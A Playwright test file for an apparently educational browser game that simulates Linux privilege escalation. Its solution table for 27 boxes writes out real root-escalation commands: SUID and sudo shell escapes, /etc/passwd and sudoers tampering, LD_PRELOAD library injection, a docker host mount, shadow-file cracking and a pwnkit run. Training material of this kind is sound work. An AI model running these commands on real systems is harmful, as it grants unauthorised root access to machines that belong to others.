// End-to-end tests: drive the real game in a browser, play each box's solution,
// and assert root / the victory modal / the flag. Mirrors tests/harness.js.
const { test, expect } = require('@playwright/test');

const SOLUTIONS = {
    1: { flag: 'flag{suid_find_pwn3d}', cmds: ['find . -exec /bin/sh -p \\;'] },
    2: { flag: 'flag{cr0n_writable_l00t}', cmds: ['echo "cp /bin/sh /tmp/rootsh; chmod +s /tmp/rootsh" > /opt/backup.sh', 'wait'] },
    3: { flag: 'flag{c4p_setuid_ftw}', cmds: ["python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"] },
    4: { flag: 'flag{path_h1jack3d}', cmds: ["echo '#!/bin/sh' > /tmp/ps", "echo '/bin/sh' >> /tmp/ps", 'chmod +x /tmp/ps', 'export PATH=/tmp:$PATH', '/usr/local/bin/status'] },
    5: { flag: 'flag{sud0_v1m_pwn}', cmds: ["sudo vim -c ':!/bin/sh'"] },
    6: { flag: 'flag{writ4ble_passwd_r00t}', cmds: ["echo 'r00t::0:0:pwned:/root:/bin/bash' >> /etc/passwd", 'su r00t'] },
    7: { flag: 'flag{sud0_awk_sh3ll}', cmds: ["sudo awk 'BEGIN{system(\"/bin/sh\")}'"] },
    8: { flag: 'flag{pwnk1t_cve_2021_4034}', cmds: ['./pwnkit'] },
    9: { flag: 'flag{cr3d_reuse_l4teral}', cmds: ['su svc', 'sudo bash'] },
    10: { flag: 'flag{d0cker_group_pwn}', cmds: ['docker run -v /:/mnt -it alpine chroot /mnt sh'] },
    11: { flag: 'flag{ld_pr3load_env_keep}', cmds: ["echo 'void _init(){setuid(0);system(\"/bin/sh\");}' > /tmp/x.c", 'gcc -shared -fPIC -nostartfiles -o /tmp/x.so /tmp/x.c', 'sudo LD_PRELOAD=/tmp/x.so apache2ctl'] },
    12: { flag: 'flag{w1ldcard_tar_ch3ckpoint}', cmds: ['cd /home/player/share', "echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > runme.sh", 'touch ./--checkpoint=1', "touch './--checkpoint-action=exec=sh runme.sh'", 'wait'] },
    13: { flag: 'flag{r00t_ssh_key_l00t}', cmds: ['ssh -i /opt/backup/id_rsa root@localhost'] },
    14: { flag: 'flag{sud0ers_d_dr0pin}', cmds: ["echo 'player ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/pwn", 'sudo bash'] },
    15: { flag: 'flag{ld_s0_preload_glob4l}', cmds: ["echo 'void _init(){setuid(0);system(\"/bin/sh\");}' > /tmp/x.c", 'gcc -shared -fPIC -nostartfiles -o /tmp/x.so /tmp/x.c', 'echo /tmp/x.so > /etc/ld.so.preload', '/usr/bin/passwd'] },
    16: { flag: 'flag{sud0_find_rebo0t}', cmds: ['sudo find . -exec /bin/sh \\;'] },
    17: { flag: 'flag{env_v4r_r00t}', cmds: ['sudo env /bin/sh'] },
    18: { flag: 'flag{pyth0n_0s_syst3m}', cmds: ["sudo python3 -c 'import os; os.system(\"/bin/sh\")'"] },
    19: { flag: 'flag{l3ss_is_r00t}', cmds: ['sudo less !/bin/sh'] },
    20: { flag: 'flag{te3_p1ped_r00t}', cmds: ["echo 'r00t::0:0::/root:/bin/bash' | sudo tee -a /etc/passwd", 'su r00t'] },
    21: { flag: 'flag{cap_dac_sh4d0w_pwn}', cmds: ["python3 -c \"print(open('/etc/shadow').read())\"", 'john /tmp/shadow.copy', 'su root'] },
    22: { flag: 'flag{ld_l1brary_p4th_pwn}', cmds: ["echo 'void _init(){setuid(0);system(\"/bin/sh\");}' > /tmp/libagent.so.1.c", 'gcc -shared -fPIC -nostartfiles -o /tmp/libagent.so.1 /tmp/libagent.so.1.c', 'sudo LD_LIBRARY_PATH=/tmp /usr/local/bin/backup-agent'] },
    23: { flag: 'flag{nfs_n0_root_squash}', cmds: ['showmount -e', 'mount -t nfs box-23:/srv/backups /mnt', 'touch /srv/backups/rootbash', 'chmod u+s /srv/backups/rootbash', '/srv/backups/rootbash'] },
    24: { flag: 'flag{p3rl_ex3c_r00t}', cmds: ["sudo perl -e 'exec \"/bin/sh\";'"] },
    25: { flag: 'flag{n0de_ch1ld_pr0cess}', cmds: ['sudo node -e \'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})\''] },
    26: {
        flag: 'flag{sud0edit_ed1tor_pwn}',
        cmds: [
            "echo '#!/bin/sh' > /tmp/pwn.sh",
            'echo \'exec /bin/sh\' >> /tmp/pwn.sh',
            'chmod +x /tmp/pwn.sh',
            'sudo EDITOR=/tmp/pwn.sh -e /etc/motd'
        ]
    },
    27: {
        flag: 'flag{dac_0verride_pwn}',
        final: true,
        cmds: ["python3 -c \"open('/etc/passwd','a').write('pwnd::0:0::/root:/bin/bash\\n')\"", 'su pwnd']
    },
};

async function enter(page, id) {
    await page.goto('/');
    await expect(page.locator('#homeGrid')).toBeVisible();
    await page.click(`[data-testid="machine-card-${id}"]`);
    await expect(page.locator('#termInput')).toBeVisible();
}

async function run(page, cmd) {
    await page.fill('#termInput', cmd);
    await page.press('#termInput', 'Enter');
}

for (const [id, sol] of Object.entries(SOLUTIONS)) {
    test(`box-${String(id).padStart(2, '0')} → root`, async ({ page }) => {
        await enter(page, id);
        for (const c of sol.cmds) await run(page, c);
        if (sol.final) {
            // The last machine triggers the "all machines owned" final modal.
            await expect(page.locator('#finalModal')).toBeVisible({ timeout: 5000 });
        } else {
            await expect(page.locator('#winModal')).toBeVisible({ timeout: 5000 });
            await expect(page.locator('#winFlag')).toHaveText(sol.flag);
            await expect(page.locator('#statRank')).toHaveText(/^[SABC]$/);
        }
    });
}

test('hub renders 22 machines across 3 tiers', async ({ page }) => {
    await page.goto('/');
    await expect(page.locator('.machine-card')).toHaveCount(27);
    await expect(page.locator('.home-tier-label')).toHaveCount(3);
    await expect(page.locator('#homeProgressText')).toHaveText('0 / 22');
});

test('pipes: cat | wc -l counts passwd lines', async ({ page }) => {
    await enter(page, 9); // box-09 has a 3-line /etc/passwd (root, player, svc)
    await run(page, 'cat /etc/passwd | wc -l');
    await expect(page.locator('#termOutput')).toContainText('3');
});

test('scorecard shows rank S with zero hints', async ({ page }) => {
    await enter(page, 8); // one-command solution → 0 hints → rank S
    await run(page, './pwnkit');
    await expect(page.locator('#winModal')).toBeVisible({ timeout: 5000 });
    await expect(page.locator('#statRank')).toHaveText('S');
});

test('theme switch applies and persists across reload', async ({ page }) => {
    await page.goto('/');
    await page.selectOption('[data-testid="home-theme-select"]', 'dracula');
    await expect(page.locator('html')).toHaveAttribute('data-theme', 'dracula');
    await page.reload();
    await expect(page.locator('html')).toHaveAttribute('data-theme', 'dracula');
    await expect(page.locator('[data-testid="home-theme-select"]')).toHaveValue('dracula');
});

test('blue team: harden box-01 after rooting', async ({ page }) => {
    await enter(page, 1);
    await run(page, 'find . -exec /bin/sh -p \\;');
    await expect(page.locator('#winModal')).toBeVisible({ timeout: 5000 });
    await expect(page.locator('#blueTeamBtn')).toBeVisible();
    await page.click('#blueTeamBtn');
    await expect(page.locator('#winModal')).toBeHidden();
    await run(page, 'chmod u-s /usr/bin/find');
    await expect(page.locator('#termOutput')).toContainText('hardened');
    await page.click('[data-testid="menu-button"]');
    await expect(page.locator('[data-testid="machine-card-1"]')).toContainText('🛡');
});

test('operator status + contextual cheatsheet (click to insert)', async ({ page }) => {
    await page.goto('/');
    await expect(page.locator('#operatorStatus')).toContainText('RANK');
    await expect(page.locator('#operatorStatus')).toContainText('owned');
    await page.click('[data-testid="machine-card-3"]'); // box-03 = CAP category
    await expect(page.locator('#cheatList')).toContainText('getcap');
    await page.locator('#cheatList code').filter({ hasText: 'getcap' }).first().click();
    await expect(page.locator('#termInput')).toHaveValue(/getcap/);
});

test('achievements unlock and appear on the hub', async ({ page }) => {
    await enter(page, 8); // one-command S-rank solve
    await run(page, './pwnkit');
    await expect(page.locator('#winModal')).toBeVisible({ timeout: 5000 });
    await expect(page.locator('.ach-toast').first()).toBeVisible();
    await page.click('#winMenuBtn');
    const ach = page.locator('#achievements');
    await expect(ach).toContainText('First Blood');
    await expect(ach.locator('.ach.is-earned').first()).toBeVisible();
});

test('man page, command tab-completion and cd -', async ({ page }) => {
    await enter(page, 1);
    await run(page, 'man sudo');
    await expect(page.locator('#termOutput')).toContainText('SYNOPSIS');
    await expect(page.locator('#termOutput')).toContainText('sudo [-l]');
    await page.fill('#termInput', 'getc');
    await page.locator('#termInput').press('Tab');
    await expect(page.locator('#termInput')).toHaveValue('getcap ');
    await run(page, 'cd /tmp');
    await run(page, 'cd -');
    await run(page, 'pwd');
    await expect(page.locator('#termOutput')).toContainText('/home/player');
});

test('sound toggle flips state and persists', async ({ page }) => {
    await page.goto('/');
    const btn = page.locator('[data-testid="home-sound-btn"]');
    await expect(btn).toHaveText('🔇'); // muted by default
    await btn.click();
    await expect(btn).toHaveText('🔊');
    await expect(btn).toHaveAttribute('aria-pressed', 'true');
    await page.reload();
    await expect(page.locator('[data-testid="home-sound-btn"]')).toHaveText('🔊');
});
